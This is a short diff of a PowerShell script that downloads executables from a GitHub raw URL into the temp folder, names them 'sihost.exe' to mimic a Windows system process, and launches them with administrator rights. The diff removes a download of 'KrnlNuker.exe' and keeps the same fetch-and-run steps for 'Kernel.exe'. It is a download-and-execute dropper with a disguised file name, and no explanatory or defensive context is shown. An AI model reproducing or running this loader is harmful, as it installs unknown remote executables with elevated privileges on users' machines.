@@ -10,8 +10,7 @@ $outputPath = [System.IO.Path]::Combine($env:TEMP, 'sihost.exe')
 
 
 $webClient = New-Object System.Net.WebClient
-$webClient.DownloadFile("https://github.com/MB2RZEN/tcx/raw/refs/heads/main/KrnlNuker.exe", $outputPath)
-Start-Process -FilePath $outputPath -Verb RunAs
-Start-Sleep -Milliseconds 200
+
 $webClient.DownloadFile("https://github.com/MB2RZEN/tcx/raw/refs/heads/main/Kernel.exe", $outputPath)
 Start-Process -FilePath $outputPath -Verb RunAs
+
